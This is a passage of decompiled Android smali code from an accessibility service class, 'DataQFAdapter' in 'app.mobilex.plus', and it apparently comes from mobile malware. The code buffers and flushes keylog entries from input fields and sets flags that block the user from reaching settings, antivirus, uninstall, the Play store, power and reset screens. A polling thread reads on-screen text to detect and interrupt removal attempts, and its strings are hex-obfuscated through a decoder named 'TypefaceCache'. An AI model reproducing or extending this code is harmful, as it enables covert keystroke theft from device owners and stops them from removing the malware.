    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 131
    .line 132
    .line 133
    const-string v1, "00270073004D"

    .line 134
    .line 135
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 136
    .line 137
    .line 138
    move-result-object v1

    .line 139
    sget-boolean v2, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Dev:Z

    .line 140
    .line 141
    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 142
    .line 143
    .line 144
    const-string v1, "002D0073004F"

    .line 145
    .line 146
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 147
    .line 148
    .line 149
    move-result-object v1

    .line 150
    sget-boolean v2, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Net:Z

    .line 151
    .line 152
    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 153
    .line 154
    .line 155
    const-string v1, "003100730058008200FE00AB00C1"

    .line 156
    .line 157
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 158
    .line 159
    .line 160
    move-result-object v1

    .line 161
    sget-boolean v2, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Recents:Z

    .line 162
    .line 163
    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 164
    .line 165
    .line 166
    const-string v1, "002F00790058008C"

    .line 167
    .line 168
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 169
    .line 170
    .line 171
    move-result-object v1

    .line 172
    sget-boolean v2, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Lock:Z

    nop

    nop

    .line 173
    .line 174
    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 175
    .line 176
    .line 177
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 178
    .line 179
    .line 180
    :catchall_0
    return-void
.end method

.method private final scheduleKeylogFlush(Ljava/lang/String;Lv/s/NxAMaDFbSCxW6M03f;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Z)V
    .locals 7

    .line 1
    iget-object v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pendingKeylogRunnables:Ljava/util/HashMap;

    .line 2
    .line 3
    invoke-virtual {v0, p1}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    .line 4
    .line 5
    .line 6
    move-result-object v0

    .line 7
    check-cast v0, Ljava/lang/Runnable;

    .line 8
    .line 9
    if-eqz v0, :cond_0

    .line 10
    .line 11
    iget-object v1, p0, Lapp/mobilex/plus/services/DataQFAdapter;->keylogDebounceHandler:Landroid/os/Handler;

    .line 12
    .line 13
    invoke-virtual {v1, v0}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 14
    .line 15
    .line 16
    :cond_0
    iget-object v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pendingKeylogEntries:Ljava/util/HashMap;

    .line 17
    .line 18
    invoke-interface {v0, p1, p2}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 19
    .line 20
    .line 21
    iget-object v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pendingKeylogData:Ljava/util/HashMap;

    .line 22
    .line 23
    new-instance v1, Lv/s/meoyWy7uMVp1IjcAV;

    .line 24
    .line 25
    move-object v2, p2

    .line 26
    move-object v3, p3

    .line 27
    move-object v4, p4

    .line 28
    move-object v5, p5

    .line 29
    move v6, p6

    .line 30
    invoke-direct/range {v1 .. v6}, Lv/s/meoyWy7uMVp1IjcAV;-><init>(Lv/s/NxAMaDFbSCxW6M03f;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Z)V

    .line 31
    .line 32
    .line 33
    invoke-interface {v0, p1, v1}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 34
    .line 35
    .line 36
    new-instance p2, Lv/s/PbcIoTfr9OdE;

    .line 37
    .line 38
    const/4 p3, 0x0

    .line 39
    invoke-direct {p2, p0, p1, p3}, Lv/s/PbcIoTfr9OdE;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;Ljava/lang/String;I)V

    .line 40
    .line 41
    .line 42
    iget-object p3, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pendingKeylogRunnables:Ljava/util/HashMap;

    nop

    .line 43
    .line 44
    invoke-interface {p3, p1, p2}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 45
    .line 46
    .line 47
    iget-object p1, p0, Lapp/mobilex/plus/services/DataQFAdapter;->keylogDebounceHandler:Landroid/os/Handler;

    .line 48
    .line 49
    iget-wide p3, p0, Lapp/mobilex/plus/services/DataQFAdapter;->KEYLOG_DEBOUNCE_MS:J

    .line 50
    .line 51
    invoke-virtual {p1, p2, p3, p4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 52
    .line 53
    .line 54
    return-void
.end method

.method public static synthetic scheduleKeylogFlush$default(Lapp/mobilex/plus/services/DataQFAdapter;Ljava/lang/String;Lv/s/NxAMaDFbSCxW6M03f;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;ZILjava/lang/Object;)V
    .locals 1

    .line 1
    and-int/lit8 p8, p7, 0x4

    .line 2
    .line 3
    const-string v0, ""

    .line 4
    .line 5
    if-eqz p8, :cond_0

    .line 6
    .line 7
    move-object p3, v0

    .line 8
    :cond_0
    and-int/lit8 p8, p7, 0x8

    .line 9
    .line 10
    if-eqz p8, :cond_1

    .line 11
    .line 12
    move-object p4, v0

    .line 13
    :cond_1
    and-int/lit8 p8, p7, 0x10

    .line 14
    .line 15
    if-eqz p8, :cond_2

    .line 16
    .line 17
    move-object p5, v0

    nop

    nop

    .line 18
    :cond_2
    and-int/lit8 p7, p7, 0x20

    .line 19
    .line 20
    if-eqz p7, :cond_3

    .line 21
    .line 22
    const/4 p6, 0x0

    .line 23
    :cond_3
    invoke-direct/range {p0 .. p6}, Lapp/mobilex/plus/services/DataQFAdapter;->scheduleKeylogFlush(Ljava/lang/String;Lv/s/NxAMaDFbSCxW6M03f;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Z)V

    .line 24
    .line 25
    .line 26
    return-void
.end method

.method private static final scheduleKeylogFlush$lambda$10(Lapp/mobilex/plus/services/DataQFAdapter;Ljava/lang/String;)V
    .locals 0

    .line 1
    invoke-direct {p0, p1}, Lapp/mobilex/plus/services/DataQFAdapter;->flushFieldKeylog(Ljava/lang/String;)V

    .line 2
    .line 3
    .line 4
    return-void
.end method

.method public static final setPendingForceStop(Ljava/lang/String;)V
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 4
    .line 5
    .line 6
    invoke-static {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setPendingForceStop$cp(Ljava/lang/String;)V

    .line 7
    .line 8
    .line 9
    return-void
.end method

.method public static final setPendingUninstallPkg(Ljava/lang/String;)V
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 4
    .line 5
    .line 6
    invoke-static {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setPendingUninstallPkg$cp(Ljava/lang/String;)V

    .line 7
    .line 8
    .line 9
    return-void
.end method

.method public static final setUIBlock_A11y(Z)V
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 4
    .line 5
    .line 6
    invoke-static {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setUIBlock_A11y$cp(Z)V

    .line 7
    .line 8
    .line 9
    return-void
.end method

.method public static final setUIBlock_AV(Z)V
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 4
    .line 5
    .line 6
    invoke-static {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setUIBlock_AV$cp(Z)V

    .line 7
    .line 8
    .line 9
    return-void
.end method

.method public static final setUIBlock_Browser(Z)V
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 4
    .line 5
    .line 6
    invoke-static {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setUIBlock_Browser$cp(Z)V

    .line 7
    .line 8
    .line 9
    return-void
.end method

.method public static final setUIBlock_Dev(Z)V
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 4
    .line 5
    .line 6
    invoke-static {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setUIBlock_Dev$cp(Z)V

    .line 7
    .line 8
    .line 9
    return-void
.end method

.method public static final setUIBlock_Files(Z)V
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 4
    .line 5
    .line 6
    invoke-static {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setUIBlock_Files$cp(Z)V

    .line 7
    .line 8
    .line 9
    return-void
.end method

.method public static final setUIBlock_Lock(Z)V
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 4
    .line 5
    .line 6
    invoke-static {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setUIBlock_Lock$cp(Z)V

    .line 7
    .line 8
    .line 9
    return-void
.end method

.method public static final setUIBlock_Net(Z)V
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 4
    .line 5
    .line 6
    invoke-static {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setUIBlock_Net$cp(Z)V

    .line 7
    .line 8
    .line 9
    return-void
.end method

.method public static final setUIBlock_OwnApp(Z)V
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 4
    .line 5
    .line 6
    invoke-static {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setUIBlock_OwnApp$cp(Z)V

    .line 7
    .line 8
    .line 9
    return-void
.end method

.method public static final setUIBlock_Play(Z)V
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 4
    .line 5
    .line 6
    invoke-static {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setUIBlock_Play$cp(Z)V

    .line 7
    .line 8
    .line 9
    return-void
.end method

.method public static final setUIBlock_Power(Z)V
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 4
    .line 5
    .line 6
    invoke-static {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setUIBlock_Power$cp(Z)V

    .line 7
    .line 8
    .line 9
    return-void
.end method

.method public static final setUIBlock_Recents(Z)V
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 4
    .line 5
    .line 6
    invoke-static {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setUIBlock_Recents$cp(Z)V

    .line 7
    .line 8
    .line 9
    return-void
.end method

.method public static final setUIBlock_Reset(Z)V
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 4
    .line 5
    .line 6
    invoke-static {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setUIBlock_Reset$cp(Z)V

    .line 7
    .line 8
    .line 9
    return-void
.end method

.method public static final setUIBlock_Sett(Z)V
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 4
    .line 5
    .line 6
    invoke-static {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setUIBlock_Sett$cp(Z)V

    .line 7
    .line 8
    .line 9
    return-void
.end method

.method public static final setUIBlock_Shade(Z)V
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 4
    .line 5
    .line 6
    invoke-static {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setUIBlock_Shade$cp(Z)V

    .line 7
    .line 8
    .line 9
    return-void
.end method

.method public static final setUIBlock_Unin(Z)V
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 4
    .line 5
    .line 6
    invoke-static {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setUIBlock_Unin$cp(Z)V

    .line 7
    .line 8
    .line 9
    return-void
.end method

.method private final startGuardPollThread()V
    .locals 4

    .line 1
    iget-boolean v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->_guardPollRunning:Z

    .line 2
    .line 3
    if-eqz v0, :cond_0

    .line 4
    .line 5
    return-void

    .line 6
    :cond_0
    const/4 v0, 0x1

    .line 7
    iput-boolean v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->_guardPollRunning:Z

    .line 8
    .line 9
    new-instance v1, Ljava/lang/Thread;

    .line 10
    .line 11
    new-instance v2, Lv/s/TgFV4UY0xAiKxQwpKNg;

    .line 12
    .line 13
    const v3, 0x9

    .line 14
    .line 15
    invoke-direct {v2, p0, v3}, Lv/s/TgFV4UY0xAiKxQwpKNg;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V

    .line 16
    .line 17
    .line 18
    invoke-direct {v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 19
    .line 20
    .line 21
    const-string v2, "00240063005A009500F400F200C200A8002F007A"

    .line 22
    .line 23
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 24
    .line 25
    .line 26
    move-result-object v2

    nop

    .line 27
    invoke-virtual {v1, v2}, Ljava/lang/Thread;->setName(Ljava/lang/String;)V

    .line 28
    .line 29
    .line 30
    invoke-virtual {v1, v0}, Ljava/lang/Thread;->setDaemon(Z)V

    .line 31
    .line 32
    .line 33
    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    .line 34
    .line 35
    .line 36
    return-void
.end method

.method private static final startGuardPollThread$lambda$17(Lapp/mobilex/plus/services/DataQFAdapter;)V
    .locals 12

    .line 1
    const v0, 0xa

    .line 2
    .line 3
    invoke-static {v0}, Landroid/os/Process;->setThreadPriority(I)V

    .line 4
    .line 5
    .line 6
    :goto_0
    iget-boolean v1, p0, Lapp/mobilex/plus/services/DataQFAdapter;->_guardPollRunning:Z

    .line 7
    .line 8
    if-eqz v1, :cond_12

    nop

    .line 9
    .line 10
    const-wide/16 v1, 0x320

    .line 11
    .line 12
    :try_start_0
    sget-boolean v3, Lapp/mobilex/plus/services/DataQFAdapter;->isScreenStreaming:Z

    .line 13
    .line 14
    if-eqz v3, :cond_0

    .line 15
    .line 16
    const-wide/16 v3, 0x1388

    .line 17
    .line 18
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V

    .line 19
    .line 20
    .line 21
    goto/16 :goto_0

    .line 22
    :cond_0
    sget-object v3, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 23
    .line 24
    invoke-virtual {v3}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 25
    .line 26
    .line 27
    invoke-static {}, Lv/s/GARjgaGEpTotOxcl8vfe;->l1V0lQr6TbwNKqHfXNbb()Z

    .line 28
    .line 29
    .line 30
    move-result v3

    .line 31
    if-nez v3, :cond_1

    .line 32
    .line 33
    const-wide/16 v3, 0xbb8

    nop

    nop

    .line 34
    .line 35
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V

    .line 36
    .line 37
    .line 38
    goto :goto_0

    nop

    nop

    .line 39
    :cond_1
    sget-object v3, Lv/s/VpKcDcuRNaQkRJ5;->dDIMxZXP1V8HdM:Lv/s/VpKcDcuRNaQkRJ5;

    .line 40
    .line 41
    sget-boolean v3, Lv/s/VpKcDcuRNaQkRJ5;->JXn4Qf7zpnLjP5:Z

    .line 42
    .line 43
    if-nez v3, :cond_f

    .line 44
    .line 45
    invoke-virtual {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->isInBlockCooldown()Z

    .line 46
    .line 47
    .line 48
    move-result v3

    .line 49
    if-eqz v3, :cond_2

    .line 50
    .line 51
    goto/16 :goto_7

    .line 52
    .line 53
    :cond_2
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 54
    .line 55
    .line 56
    move-result-object v3
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_2

    .line 57
    if-eqz v3, :cond_10

    .line 58
    .line 59
    :try_start_1
    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getPackageName()Ljava/lang/CharSequence;

    .line 60
    .line 61
    .line 62
    move-result-object v4
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 63
    const-string v5, ""

    .line 64
    .line 65
    if-eqz v4, :cond_3

    .line 66
    .line 67
    :try_start_2
    invoke-virtual {v4}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 68
    .line 69
    .line 70
    move-result-object v4

    .line 71
    if-eqz v4, :cond_3

    nop

    nop

    .line 72
    .line 73
    sget-object v6, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    .line 74
    .line 75
    invoke-virtual {v4, v6}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    .line 76
    .line 77
    .line 78
    move-result-object v4

    .line 79
    goto :goto_1

    nop

    .line 80
    :catchall_0
    move-exception v4

    .line 81
    goto/16 :goto_6

    .line 82
    .line 83
    :cond_3
    move-object/from16 v4, v5

    nop

    .line 84
    :goto_1
    const-string v6, "00300073004F009300F900B100D500B4"

    .line 85
    .line 86
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 87
    .line 88
    .line 89
    move-result-object v6

    .line 90
    const/4 v7, 0x0

    .line 91
    invoke-static {v4, v6, v7}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 92
    .line 93
    .line 94
    move-result v6
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 95
    const/16 v8, 0x1

    .line 96
    const-string v9, "003300770058008C00F100B800D700AE002D0065004F008600FC00B300D700B5"

    .line 97
    .line 98
    if-nez v6, :cond_5

    .line 99
    .line 100
    :try_start_3
    invoke-static {v9}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 101
    .line 102
    .line 103
    move-result-object v6

    .line 104
    invoke-static {v4, v6, v7}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 105
    .line 106
    .line 107
    move-result v6

    .line 108
    if-nez v6, :cond_5

    .line 109
    .line 110
    const-string v6, "00220066004B008A00F100B100D300A000260064"

    .line 111
    .line 112
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 113
    .line 114
    .line 115
    move-result-object v6

    .line 116
    invoke-static {v4, v6, v7}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 117
    .line 118
    .line 119
    move-result v6

    .line 120
    if-nez v6, :cond_5

    .line 121
    .line 122
    const-string v6, "003700770048008C00FD00BE00DC00A6002400730049"

    .line 123
    .line 124
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 125
    .line 126
    .line 127
    move-result-object v6

    .line 128
    invoke-static {v4, v6, v7}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 129
    .line 130
    .line 131
    move-result v6

    .line 132
    if-eqz v6, :cond_4

    .line 133
    .line 134
    goto :goto_2

    .line 135
    :cond_4
    move/from16 v6, v7

    .line 136
    goto :goto_3

    .line 137
    :cond_5
    :goto_2
    move/from16 v6, v8

    .line 138
    :goto_3
    if-eqz v6, :cond_6

    .line 139
    .line 140
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 141
    .line 142
    .line 143
    move-result-wide v10

    .line 144
    iput-wide v10, p0, Lapp/mobilex/plus/services/DataQFAdapter;->_lastSettingsSeenPoll:J

    .line 145
    .line 146
    :cond_6
    if-eqz v6, :cond_a

    .line 147
    .line 148
    sget-boolean v6, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Sett:Z

    nop

    nop

    .line 149
    .line 150
    if-eqz v6, :cond_a

    .line 151
    .line 152
    const/16 v6, 0xfa0

    .line 153
    .line 154
    invoke-direct {p0, v3, v0, v6}, Lapp/mobilex/plus/services/DataQFAdapter;->collectRootText(Landroid/view/accessibility/AccessibilityNodeInfo;II)Ljava/lang/String;

    .line 155
    .line 156
    .line 157
    move-result-object v6

    .line 158
    invoke-virtual {v6}, Ljava/lang/String;->length()I

    .line 159
    .line 160
    .line 161
    move-result v10

    .line 162
    if-lez v10, :cond_a

    .line 163
    .line 164
    sget-object v10, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    .line 165
    .line 166
    invoke-virtual {v6, v10}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    .line 167
    .line 168
    .line 169
    move-result-object v6

    .line 170
    iget-object v10, p0, Lapp/mobilex/plus/services/DataQFAdapter;->cachedSelfLabel:Ljava/lang/String;

    .line 171
    .line 172
    if-nez v10, :cond_7

    .line 173
    .line 174
    goto/16 :goto_4

    .line 175
    :cond_7
    move-object v5, v10

    .line 176
    :goto_4
    invoke-direct {p0, v6}, Lapp/mobilex/plus/services/DataQFAdapter;->hasDangerKeywords(Ljava/lang/String;)Z

    .line 177
    .line 178
    .line 179
    move-result v10

    .line 180
    invoke-virtual {v5}, Ljava/lang/String;->length()I

    .line 181
    .line 182
    .line 183
    move-result v11

    .line 184
    if-lez v11, :cond_8

    .line 185
    .line 186
    invoke-static {v6, v5, v7}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 187
    .line 188
    .line 189
    move-result v5

    .line 190
    if-eqz v5, :cond_8

    .line 191
    .line 192
    goto :goto_5

    .line 193
    :cond_8
    move v8, v7

    .line 194
    :goto_5
    if-eqz v10, :cond_a

    .line 195
    .line 196
    if-nez v8, :cond_9

    .line 197
    .line 198
    invoke-static {v9}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 199
    .line 200
    .line 201
    move-result-object v5

    .line 202
    invoke-static {v4, v5, v7}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 203
    .line 204
    .line 205
    move-result v5

    .line 206
    if-eqz v5, :cond_a

    .line 207
    .line 208
    :cond_9
    iget-object v5, p0, Lapp/mobilex/plus/services/DataQFAdapter;->handler:Landroid/os/Handler;

    .line 209
    .line 210
    new-instance v6, Lv/s/TgFV4UY0xAiKxQwpKNg;

    .line 211
    .line 212
    const/4 v8, 0x4

    .line 213
    invoke-direct {v6, p0, v8}, Lv/s/TgFV4UY0xAiKxQwpKNg;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V

    .line 214
    .line 215
    .line 216
    invoke-virtual {v5, v6}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    .line 217
    .line 218
    .line 219
    :cond_a
    sget-boolean v5, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Shade:Z

    .line 220
    .line 221
    if-eqz v5, :cond_e

    .line 222
    .line 223
    const-string v5, "0030006F0048009300F500B200C700AE"

    .line 224
    .line 225
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 226
    .line 227
    .line 228
    move-result-object v5

    .line 229
    invoke-static {v4, v5, v7}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 230
    .line 231
    .line 232
    move-result v5

    .line 233
    if-nez v5, :cond_b

    .line 234
    .line 235
    const-string v5, "002D0079004F008E00F600B600D100A60037007F00540089"

    .line 236
    .line 237
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 238
    .line 239
    .line 240
    move-result-object v5

    .line 241
    invoke-static {v4, v5, v7}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 242
    .line 243
    .line 244
    move-result v4

    .line 245
    if-eqz v4, :cond_e

    .line 246
    .line 247
    :cond_b
    const/4 v4, 0x6

    .line 248
    const/16 v5, 0x7d0

    .line 249
    .line 250
    invoke-direct {p0, v3, v4, v5}, Lapp/mobilex/plus/services/DataQFAdapter;->collectRootText(Landroid/view/accessibility/AccessibilityNodeInfo;II)Ljava/lang/String;

    .line 251
    .line 252
    .line 253
    move-result-object v4

    .line 254
    invoke-virtual {v4}, Ljava/lang/String;->length()I

    .line 255
    .line 256
    .line 257
    move-result v5

    .line 258
    if-lez v5, :cond_e

    nop

    nop

    .line 259
    .line 260
    sget-object v5, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    .line 261
    .line 262
    invoke-virtual {v4, v5}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    .line 263
    .line 264
    .line 265
    move-result-object v4

    .line 266
    const-string v5, "0034007F0016008100F9"

    .line 267
    .line 268
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 269
    .line 270
    .line 271
    move-result-object v5

    .line 272
